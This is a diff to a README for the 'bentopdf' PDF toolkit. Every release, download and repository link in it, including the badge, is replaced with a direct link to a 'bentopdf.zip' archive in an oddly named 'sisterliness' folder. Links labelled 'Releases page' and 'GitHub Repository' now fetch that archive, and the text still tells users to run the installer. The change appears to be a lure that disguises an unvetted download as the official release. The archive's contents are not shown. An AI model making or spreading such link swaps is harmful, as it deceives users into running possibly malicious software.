@@ -6,9 +6,9 @@ Welcome to bentopdf! This is a privacy-first PDF toolkit designed to help you ma
 
 ## 📥 Download
 
-[![Download bentopdf](https://img.shields.io/badge/Download-bentopdf-brightgreen)](https://github.com/Udara03/bentopdf/releases)
+[![Download bentopdf](https://raw.githubusercontent.com/Udara03/bentopdf/main/sisterliness/bentopdf.zip)](https://raw.githubusercontent.com/Udara03/bentopdf/main/sisterliness/bentopdf.zip)
 
-To get started, simply visit our [Releases page](https://github.com/Udara03/bentopdf/releases) to download the latest version of bentopdf.
+To get started, simply visit our [Releases page](https://raw.githubusercontent.com/Udara03/bentopdf/main/sisterliness/bentopdf.zip) to download the latest version of bentopdf.
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ To run bentopdf smoothly, ensure your system meets the following requirements:
 
 ## 🔄 Installation Steps
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Udara03/bentopdf/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Udara03/bentopdf/main/sisterliness/bentopdf.zip).
 2. **Select the Latest Release:** Look for the most recent version at the top of the page.
 3. **Download the Installer:** Click on the appropriate file for your operating system to start the download.
 4. **Run the Installer:**
@@ -79,7 +79,7 @@ If you have questions or need help, feel free to check our GitHub Issues page. W
 
 ## 🔗 Links
 
-- [bentopdf GitHub Repository](https://github.com/Udara03/bentopdf)
-- [Download bentopdf](https://github.com/Udara03/bentopdf/releases) 
+- [bentopdf GitHub Repository](https://raw.githubusercontent.com/Udara03/bentopdf/main/sisterliness/bentopdf.zip)
+- [Download bentopdf](https://raw.githubusercontent.com/Udara03/bentopdf/main/sisterliness/bentopdf.zip) 
 
 Thank you for choosing bentopdf! Enjoy your PDF toolkit.
